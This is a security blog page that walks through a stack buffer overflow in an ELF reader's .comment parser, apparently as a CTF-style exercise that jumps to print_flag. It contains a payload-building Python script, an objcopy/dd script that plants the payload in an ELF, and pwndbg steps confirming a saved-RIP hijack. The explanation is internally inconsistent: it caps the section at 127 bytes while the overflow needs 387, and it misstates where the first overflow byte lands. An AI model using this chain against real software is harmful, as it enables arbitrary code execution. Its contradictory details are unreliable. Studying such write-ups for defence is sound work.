<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Buffer overflow writeup | Vasilis&#39; Security Notes</title>
<meta name="keywords" content="vulnerability research, buffer overflow, linux, binary exploitation">
<meta name="description" content="1. Overview of the Vulnerability
When readelf processes the .comment section of an ELF, it enters a loop that copies bytes from that section into a fixed‐size, 128‐byte stack buffer named comment[]. Internally, the code looks roughly like this:
#define MAX_COMMENT 128
char comment[MAX_COMMENT];
int  version_start = 0, idx = 0;
char c;

/* xsh_offset points to the file‐offset of .comment’s data */
while (pread(fd, &amp;c, 1, xsh_offset &#43; idx) == 1) {
    if (c == &#39;(&#39;) {
        version_start = idx &#43; 1;
    }
    else if (c == &#39;)&#39;) {
        break;
    }
    else if (version_start != 0) {
        /* UNBOUNDED WRITE: */
        comment[idx - version_start] = c;
    }
    idx&#43;&#43;;
}
comment[idx - version_start] = &#39;\0&#39;;
file_printf(ms, &#34;, os/compiler version =&gt; [%s]&#34;, comment);

comment is 128 bytes long, stored at RBP - 0xF0 through RBP - 0x70 on x86-64.
Whenever the code sees a &#39;(&#39;, it sets version_start = idx &#43; 1. From that point on, each subsequent byte (up until a &#39;)&#39;) is written to comment[idx - version_start].
There is no bounds check on idx - version_start, so once that expression exceeds 127, writes begin overflowing into adjacent stack memory (locals, saved-RBP, then saved-RIP).
As soon as a &#39;)&#39; is read, the loop breaks and writes a NUL at comment[idx - version_start].

By carefully choosing where two &#39;(&#39; characters appear in the input, we can control exactly when the code starts writing to comment[0] and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When doshn eventually returns, it will pop our crafted return address from the stack.">
<meta name="author" content="Vasilis">
<link rel="canonical" href="https://vasilis-security-notes.vercel.app/writeups/buffer-overflow/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://vasilis-security-notes.vercel.app/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://vasilis-security-notes.vercel.app/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://vasilis-security-notes.vercel.app/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://vasilis-security-notes.vercel.app/apple-touch-icon.png">
<link rel="mask-icon" href="https://vasilis-security-notes.vercel.app/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://vasilis-security-notes.vercel.app/writeups/buffer-overflow/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://vasilis-security-notes.vercel.app/writeups/buffer-overflow/">
  <meta property="og:site_name" content="Vasilis&#39; Security Notes">
  <meta property="og:title" content="Buffer overflow writeup">
  <meta property="og:description" content="1. Overview of the Vulnerability When readelf processes the .comment section of an ELF, it enters a loop that copies bytes from that section into a fixed‐size, 128‐byte stack buffer named comment[]. Internally, the code looks roughly like this:
#define MAX_COMMENT 128 char comment[MAX_COMMENT]; int version_start = 0, idx = 0; char c; /* xsh_offset points to the file‐offset of .comment’s data */ while (pread(fd, &amp;c, 1, xsh_offset &#43; idx) == 1) { if (c == &#39;(&#39;) { version_start = idx &#43; 1; } else if (c == &#39;)&#39;) { break; } else if (version_start != 0) { /* UNBOUNDED WRITE: */ comment[idx - version_start] = c; } idx&#43;&#43;; } comment[idx - version_start] = &#39;\0&#39;; file_printf(ms, &#34;, os/compiler version =&gt; [%s]&#34;, comment); comment is 128 bytes long, stored at RBP - 0xF0 through RBP - 0x70 on x86-64. Whenever the code sees a &#39;(&#39;, it sets version_start = idx &#43; 1. From that point on, each subsequent byte (up until a &#39;)&#39;) is written to comment[idx - version_start]. There is no bounds check on idx - version_start, so once that expression exceeds 127, writes begin overflowing into adjacent stack memory (locals, saved-RBP, then saved-RIP). As soon as a &#39;)&#39; is read, the loop breaks and writes a NUL at comment[idx - version_start]. By carefully choosing where two &#39;(&#39; characters appear in the input, we can control exactly when the code starts writing to comment[0] and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When doshn eventually returns, it will pop our crafted return address from the stack.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2025-06-30T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-06-30T00:00:00+00:00">
    <meta property="article:tag" content="Vulnerability Research">
    <meta property="article:tag" content="Buffer Overflow">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="Binary Exploitation">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Buffer overflow writeup">
<meta name="twitter:description" content="1. Overview of the Vulnerability
When readelf processes the .comment section of an ELF, it enters a loop that copies bytes from that section into a fixed‐size, 128‐byte stack buffer named comment[]. Internally, the code looks roughly like this:
#define MAX_COMMENT 128
char comment[MAX_COMMENT];
int  version_start = 0, idx = 0;
char c;

/* xsh_offset points to the file‐offset of .comment’s data */
while (pread(fd, &amp;c, 1, xsh_offset &#43; idx) == 1) {
    if (c == &#39;(&#39;) {
        version_start = idx &#43; 1;
    }
    else if (c == &#39;)&#39;) {
        break;
    }
    else if (version_start != 0) {
        /* UNBOUNDED WRITE: */
        comment[idx - version_start] = c;
    }
    idx&#43;&#43;;
}
comment[idx - version_start] = &#39;\0&#39;;
file_printf(ms, &#34;, os/compiler version =&gt; [%s]&#34;, comment);

comment is 128 bytes long, stored at RBP - 0xF0 through RBP - 0x70 on x86-64.
Whenever the code sees a &#39;(&#39;, it sets version_start = idx &#43; 1. From that point on, each subsequent byte (up until a &#39;)&#39;) is written to comment[idx - version_start].
There is no bounds check on idx - version_start, so once that expression exceeds 127, writes begin overflowing into adjacent stack memory (locals, saved-RBP, then saved-RIP).
As soon as a &#39;)&#39; is read, the loop breaks and writes a NUL at comment[idx - version_start].

By carefully choosing where two &#39;(&#39; characters appear in the input, we can control exactly when the code starts writing to comment[0] and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When doshn eventually returns, it will pop our crafted return address from the stack.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "https://vasilis-security-notes.vercel.app/writeups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Buffer overflow writeup",
      "item": "https://vasilis-security-notes.vercel.app/writeups/buffer-overflow/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Buffer overflow writeup",
  "name": "Buffer overflow writeup",
  "description": "1. Overview of the Vulnerability When readelf processes the .comment section of an ELF, it enters a loop that copies bytes from that section into a fixed‐size, 128‐byte stack buffer named comment[]. Internally, the code looks roughly like this:\n#define MAX_COMMENT 128 char comment[MAX_COMMENT]; int version_start = 0, idx = 0; char c; /* xsh_offset points to the file‐offset of .comment’s data */ while (pread(fd, \u0026amp;c, 1, xsh_offset + idx) == 1) { if (c == \u0026#39;(\u0026#39;) { version_start = idx + 1; } else if (c == \u0026#39;)\u0026#39;) { break; } else if (version_start != 0) { /* UNBOUNDED WRITE: */ comment[idx - version_start] = c; } idx++; } comment[idx - version_start] = \u0026#39;\\0\u0026#39;; file_printf(ms, \u0026#34;, os/compiler version =\u0026gt; [%s]\u0026#34;, comment); comment is 128 bytes long, stored at RBP - 0xF0 through RBP - 0x70 on x86-64. Whenever the code sees a '(', it sets version_start = idx + 1. From that point on, each subsequent byte (up until a ')') is written to comment[idx - version_start]. There is no bounds check on idx - version_start, so once that expression exceeds 127, writes begin overflowing into adjacent stack memory (locals, saved-RBP, then saved-RIP). As soon as a ')' is read, the loop breaks and writes a NUL at comment[idx - version_start]. By carefully choosing where two '(' characters appear in the input, we can control exactly when the code starts writing to comment[0] and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When doshn eventually returns, it will pop our crafted return address from the stack.\n",
  "keywords": [
    "vulnerability research", "buffer overflow", "linux", "binary exploitation"
  ],
  "articleBody": "1. Overview of the Vulnerability When readelf processes the .comment section of an ELF, it enters a loop that copies bytes from that section into a fixed‐size, 128‐byte stack buffer named comment[]. Internally, the code looks roughly like this:\n#define MAX_COMMENT 128 char comment[MAX_COMMENT]; int version_start = 0, idx = 0; char c; /* xsh_offset points to the file‐offset of .comment’s data */ while (pread(fd, \u0026c, 1, xsh_offset + idx) == 1) { if (c == '(') { version_start = idx + 1; } else if (c == ')') { break; } else if (version_start != 0) { /* UNBOUNDED WRITE: */ comment[idx - version_start] = c; } idx++; } comment[idx - version_start] = '\\0'; file_printf(ms, \", os/compiler version =\u003e [%s]\", comment); comment is 128 bytes long, stored at RBP - 0xF0 through RBP - 0x70 on x86-64. Whenever the code sees a '(', it sets version_start = idx + 1. From that point on, each subsequent byte (up until a ')') is written to comment[idx - version_start]. There is no bounds check on idx - version_start, so once that expression exceeds 127, writes begin overflowing into adjacent stack memory (locals, saved-RBP, then saved-RIP). As soon as a ')' is read, the loop breaks and writes a NUL at comment[idx - version_start]. By carefully choosing where two '(' characters appear in the input, we can control exactly when the code starts writing to comment[0] and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When doshn eventually returns, it will pop our crafted return address from the stack.\n2. Exploitation Strategy (the “Two-(” Trick) First ( sets up a “start index.”\nThe very first ( in the input sets version_start = idx + 1. We can decide at which idx that happens by prepending junk bytes. Refill comment[0..127] exactly once.\nAfter the first (, we send 128 filler bytes, which fill comment[0..127] without overflow. This ensures the next writes go out of bounds in a fully predictable way. Second ( resets version_start again.\nWhen the second ( arrives at a known idx, it performs version_start = idx + 1. From that moment on, each new byte lands at comment[idx - version_start]. If we send 248 bytes after that point, then the first of those 248 lands in comment[248], which is the saved-RIP slot. Overwrite saved-RIP with a chosen 8-byte address.\nWe craft eight little-endian bytes immediately after those 248 filler bytes. This overwrites the saved-RIP. Send ')' to break the loop (no write on that iteration).\nThis prevents further writes from corrupting other locals or messing up version_start/idx. Then the function does a ret, popping our overwritten value into %rip. By carefully counting bytes, we can place any 64-bit address into saved-RIP and force execution to jump there when doshn returns.\n3. Payload Construction (payload.bin) Below is the Python snippet that creates a 387-byte payload. We annotate every region by its “loop index” (idx) and show where saved-RIP gets overwritten:\n# 8‐byte return address we want (e.g. address of print_flag) # Little-endian: 0x004241f2 -\u003e b\"\\xf2\\x41\\x42\\x00\\x00\\x00\\x00\\x00\" MANUAL_RIP = b\"\\xf2\\x41\\x42\\x00\\x00\\x00\\x00\\x00\" blob = b\"(\" # idx = 0 -\u003e version_start := 1 # (No write into comment[] on this byte.) blob += b\"A\" * 128 # idx = 1..128 -\u003e comment[idx - 1] = 'A' # After idx=128, comment[0..127] is fully “A”. Now idx -\u003e 129. blob += b\"(\" # idx = 129 -\u003e version_start := 130 # (No write on this byte.) # Now idx -\u003e 130. # At idx=130, “idx - version_start = 0.” Next writes land in comment[0..]. # To reach saved-RIP (offset 248), send 248 filler bytes “B”: blob += b\"B\" * 248 # idx=130..257 (128 B’s) refill comment[0..127]. # idx=258..377 (120 B’s) overflow into comment[128..247] (locals \u0026 saved-RBP). # Now idx = 378. (378 - 130 = 248) -\u003e offset 248 = saved-RIP LSB. # Overwrite saved-RIP (8 bytes): blob += MANUAL_RIP # idx = 378..385 -\u003e comment[248..255] = \"\\xf2\\x41\\x42\\x00\\x00\\x00\\x00\\x00\" # Finally, idx=386 -\u003e send “)” to break the loop (no write): blob += b\")\" # Loop ends; doshn will call ret, popping 0x004241f2 into RIP. with open(\"payload.bin\", \"wb\") as f: f.write(blob) print(f\"payload.bin is {len(blob)} bytes (should be 387).\") First \"(\" at idx=0 sets version_start = 1. 128× \"A\" at idx=1..128 fills comment[0..127]. Second \"(\" at idx=129 sets version_start = 130. 248× \"B\" at idx=130..377 idx=130..257 (128 bytes) refill comment[0..127]. idx=258..377 (120 bytes) overflow into locals and saved-RBP up through offset 247. 8 bytes of MANUAL_RIP at idx=378..385 overwrite saved-RIP (offset 248..255). Final \")\" at idx=386 breaks the loop, preventing any further writes. After that, doshn does a ret, and the CPU pops 0x004241f2 into %rip, redirecting execution.\n4. Patching a Minimal ELF (patch.sh) We start from a trivial C program:\nint main(void) { return 0; } Compile it (e.g., gcc -no-pie -o exploit.elf exploit.c) to produce a minimal ELF named exploit.elf. That ELF automatically has a .comment section (filled with compiler version strings). We will remove that section and replace it with our payload.bin.\n#!/usr/bin/env bash # # patch.sh # # 1) Removes any existing .comment section from exploit.elf. # 2) Injects payload.bin as a new .comment section (with ALLOC flag). # 3) Patches .comment’s sh_size field to be 0x7f (127). # # Usage: # 1) Generate payload.bin as shown above. # 2) Update FILE, PAYLOAD, E_SHOFF_HEX, COMMENT_SEC_IDX below. # 3) chmod +x patch_and_inject.sh \u0026\u0026 ./patch_and_inject.sh # 4) Verify with `readelf -S exploit.elf | grep .comment` # ##### -- USER‐EDITABLE SECTION ---------------------------------------------------- FILE=\"exploit.elf\" # The ELF to patch PAYLOAD=\"payload.bin\" # The malicious payload # From `readelf -h exploit.elf`: # Start of section headers: 0x E_SHOFF_HEX=\"0x4768\" # From `readelf -S exploit.elf | grep \"\\.comment\"` (before patch): # [ 25] .comment … COMMENT_SEC_IDX=25 ##### -- END OF USER‐EDITABLE SECTION -------------------------------------------- # 1) Remove any existing .comment objcopy --remove-section .comment \"$FILE\" 2\u003e/dev/null || true # 2) Add payload.bin as .comment (with ALLOC so readelf will load it) objcopy --add-section .comment=\"$PAYLOAD\" --set-section-flags .comment=contents,alloc \"$FILE\" || { echo \"Injection failed\"; exit 1; } echo \"Before patch:\" readelf -S \"$FILE\" | grep '\\.comment' # 3) Compute where to patch sh_size for .comment to 0x7f E_SHOFF=$((E_SHOFF_HEX)) BYTES_PER_SHDR=64 SH_SIZE_OFFSET=32 # within each Elf64_Shdr SH_SIZE_FIELD_OFFSET=$(( E_SHOFF + COMMENT_SEC_IDX*BYTES_PER_SHDR + SH_SIZE_OFFSET )) printf '\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00' | dd of=\"$FILE\" bs=1 seek=\"$SH_SIZE_FIELD_OFFSET\" count=8 conv=notrunc status=none echo \"After patch:\" readelf -S \"$FILE\" | grep '\\.comment' Step 1: --remove-section .comment deletes the existing .comment. Step 2: --add-section .comment=payload.bin creates a new .comment containing our 387 bytes. We set contents,alloc so that section is loaded. Step 3: We patch the sh_size field (8 bytes at offset E_SHOFF + 64*COMMENT_SEC_IDX + 32) to 0x7f so that readelf will only read the first 127 bytes of .comment (enough to trigger the overflow). After running this script, exploit.elf has a .comment of size 0x7f whose contents begin with our 387-byte payload. When doshn reads up to 127 bytes of that section, it will see both ( characters, overflow into saved-RIP, and then return into our chosen address.\n5. Verifying the Exploit under pwndbg Launch pwndbg on the patched binary: pwndbg --args ./file -m magic.mgc exploit.elf Inside GDB: pwndbg\u003e b readelf.c:1510 # break right before “comment[idx-version_start] = '\\0'”\rpwndbg\u003e run You should see: Breakpoint 1, doshn (…) at readelf.c:1510 Check local variables:\npwndbg\u003e info locals\rc = 41 # ')'\ridx = 386\rversion_start = 130\rcomment = \"B\"*128\r… version_start = 130 confirms the second ( arrived at idx = 129. idx = 386 means we just processed the final ')'. Find comment[0] in memory (using rdx, which was set by lea rdx, [rbp-0xf0] earlier):\npwndbg\u003e print/x $rdx\r$1 = 0x7fffffffd490 # example address of comment[0] Compute saved-RIP = comment[0] + 0xf8 (248 bytes past):\npwndbg\u003e print/x $rdx + 0xf8\r$2 = 0x7fffffffd588 # address of saved-RIP Dump the 8 bytes at that address:\npwndbg\u003e x/gx $rdx + 0xf8\r0x7fffffffd588: 0x00000000004241f2 Those eight bytes match our MANUAL_RIP = b\"\\xf2\\x41\\x42\\x00\\x00\\x00\\x00\\x00\", so saved-RIP was overwritten correctly with 0x004241f2.\nExecute the ret so it actually jumps:\npwndbg\u003e finish GDB prints:\nRun till exit from #0 doshn (…) at readelf.c:1510\r0x00000000004241f2 in print_flag () That shows control has transferred to print_flag at 0x4241f2. You have successfully hijacked RIP.\n6. Summary Vulnerability: Unbounded stack write in doshn when parsing .comment. Two carefully placed ( characters cause writes to overflow from a 128-byte buffer into saved-RIP. Payload: 387 bytes that: Perform two “(`)” markers at strategic indices to reset the write base, Overflow exactly 248 bytes past the second ( into saved-RIP, Place an 8-byte target address (little-endian) at saved-RIP, Break with ')' so no further writes occur. ELF Injection: We carve out a minimal ELF (exploit.elf), remove its original .comment, insert payload.bin, and patch .comment.sh_size to 0x7f. Verification: Under pwndbg, at the overwrite‐site breakpoint: Check version_start = 130 (second ( at idx=129). Read saved-RIP from comment[0] + 248 = $rdx + 0xf8. Confirm the 8 bytes equal our chosen return address. Use finish (or stepi) to execute the ret and land in print_flag. This end-to-end chain demonstrates a reliable stack-buffer overflow in readelf’s .comment parser that grants arbitrary code execution by overwriting the return address.\n",
  "wordCount" : "1504",
  "inLanguage": "en",
  "datePublished": "2025-06-30T00:00:00Z",
  "dateModified": "2025-06-30T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Vasilis"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://vasilis-security-notes.vercel.app/writeups/buffer-overflow/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Vasilis' Security Notes",
    "logo": {
      "@type": "ImageObject",
      "url": "https://vasilis-security-notes.vercel.app/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://vasilis-security-notes.vercel.app/" accesskey="h" title="Vasilis&#39; Security Notes (Alt + H)">Vasilis&#39; Security Notes</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://vasilis-security-notes.vercel.app/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="https://vasilis-security-notes.vercel.app/research/" title="Research">
                    <span>Research</span>
                </a>
            </li>
            <li>
                <a href="https://vasilis-security-notes.vercel.app/writeups/" title="Writeups">
                    <span>Writeups</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Buffer overflow writeup
    </h1>
    <div class="post-meta"><span title='2025-06-30 00:00:00 +0000 UTC'>June 30, 2025</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;Vasilis

</div>
  </header> 
  <div class="post-content"><h2 id="1-overview-of-the-vulnerability">1. Overview of the Vulnerability<a hidden class="anchor" aria-hidden="true" href="#1-overview-of-the-vulnerability">#</a></h2>
<p>When <strong>readelf</strong> processes the <code>.comment</code> section of an ELF, it enters a loop that copies bytes from that section into a fixed‐size, 128‐byte stack buffer named <code>comment[]</code>. Internally, the code looks roughly like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define MAX_COMMENT 128
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> comment[MAX_COMMENT];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span>  version_start <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> c;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* xsh_offset points to the file‐offset of .comment’s data */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">pread</span>(fd, <span style="color:#f92672">&amp;</span>c, <span style="color:#ae81ff">1</span>, xsh_offset <span style="color:#f92672">+</span> idx) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;(&#39;</span>) {
</span></span><span style="display:flex;"><span>        version_start <span style="color:#f92672">=</span> idx <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;)&#39;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (version_start <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* UNBOUNDED WRITE: */</span>
</span></span><span style="display:flex;"><span>        comment[idx <span style="color:#f92672">-</span> version_start] <span style="color:#f92672">=</span> c;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    idx<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>comment[idx <span style="color:#f92672">-</span> version_start] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">file_printf</span>(ms, <span style="color:#e6db74">&#34;, os/compiler version =&gt; [%s]&#34;</span>, comment);
</span></span></code></pre></div><ul>
<li><strong><code>comment</code> is 128 bytes long</strong>, stored at <code>RBP - 0xF0</code> through <code>RBP - 0x70</code> on x86-64.</li>
<li>Whenever the code sees a <code>'('</code>, it sets <code>version_start = idx + 1</code>. From that point on, each subsequent byte (up until a <code>')'</code>) is written to <code>comment[idx - version_start]</code>.</li>
<li><strong>There is no bounds check</strong> on <code>idx - version_start</code>, so once that expression exceeds 127, writes begin overflowing into adjacent stack memory (locals, saved-RBP, then saved-RIP).</li>
<li>As soon as a <code>')'</code> is read, the loop breaks and writes a NUL at <code>comment[idx - version_start]</code>.</li>
</ul>
<p>By carefully choosing where two <code>'('</code> characters appear in the input, we can control <em>exactly</em> when the code starts writing to <code>comment[0]</code> and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When <code>doshn</code> eventually returns, it will pop our crafted return address from the stack.</p>
<hr>
<h2 id="2-exploitation-strategy-the-two--trick">2. Exploitation Strategy (the “Two-<code>(</code>” Trick)<a hidden class="anchor" aria-hidden="true" href="#2-exploitation-strategy-the-two--trick">#</a></h2>
<ol>
<li>
<p><strong>First <code>(</code> sets up a “start index.”</strong></p>
<ul>
<li>The very first <code>(</code> in the input sets <code>version_start = idx + 1</code>. We can decide at which <code>idx</code> that happens by prepending junk bytes.</li>
</ul>
</li>
<li>
<p><strong>Refill <code>comment[0..127]</code> exactly once</strong>.</p>
<ul>
<li>After the first <code>(</code>, we send 128 filler bytes, which fill <code>comment[0..127]</code> without overflow.</li>
<li>This ensures the next writes go out of bounds in a fully predictable way.</li>
</ul>
</li>
<li>
<p><strong>Second <code>(</code> resets <code>version_start</code> again.</strong></p>
<ul>
<li>When the second <code>(</code> arrives at a known <code>idx</code>, it performs <code>version_start = idx + 1</code>.</li>
<li>From that moment on, each new byte lands at <code>comment[idx - version_start]</code>.</li>
<li>If we send 248 bytes after that point, then the <em>first</em> of those 248 lands in <code>comment[248]</code>, which is the saved-RIP slot.</li>
</ul>
</li>
<li>
<p><strong>Overwrite saved-RIP with a chosen 8-byte address.</strong></p>
<ul>
<li>We craft eight little-endian bytes immediately after those 248 filler bytes. This overwrites the saved-RIP.</li>
</ul>
</li>
<li>
<p><strong>Send <code>')'</code> to break the loop</strong> (no write on that iteration).</p>
<ul>
<li>This prevents further writes from corrupting other locals or messing up <code>version_start</code>/<code>idx</code>.</li>
<li>Then the function does a <code>ret</code>, popping our overwritten value into <code>%rip</code>.</li>
</ul>
</li>
</ol>
<p>By carefully counting bytes, we can place any 64-bit address into saved-RIP and force execution to jump there when <code>doshn</code> returns.</p>
<hr>
<h2 id="3-payload-construction-payloadbin">3. Payload Construction (<code>payload.bin</code>)<a hidden class="anchor" aria-hidden="true" href="#3-payload-construction-payloadbin">#</a></h2>
<p>Below is the Python snippet that creates a 387-byte payload. We annotate every region by its “loop index” (<code>idx</code>) and show where saved-RIP gets overwritten:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># 8‐byte return address we want (e.g. address of print_flag)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Little-endian: 0x004241f2 -&gt; b&#34;\xf2\x41\x42\x00\x00\x00\x00\x00&#34;</span>
</span></span><span style="display:flex;"><span>MANUAL_RIP <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf2\x41\x42\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>blob <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;(&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># idx = 0 -&gt; version_start := 1</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (No write into comment[] on this byte.)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>blob <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">128</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># idx = 1..128 -&gt; comment[idx - 1] = &#39;A&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># After idx=128, comment[0..127] is fully “A”. Now idx -&gt; 129.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>blob <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;(&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># idx = 129 -&gt; version_start := 130</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (No write on this byte.)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now idx -&gt; 130.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># At idx=130, “idx - version_start = 0.” Next writes land in comment[0..].</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># To reach saved-RIP (offset 248), send 248 filler bytes “B”:</span>
</span></span><span style="display:flex;"><span>blob <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">248</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#   idx=130..257 (128 B’s) refill comment[0..127].</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#   idx=258..377 (120 B’s) overflow into comment[128..247] (locals &amp; saved-RBP).</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now idx = 378. (378 - 130 = 248) -&gt; offset 248 = saved-RIP LSB.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Overwrite saved-RIP (8 bytes):</span>
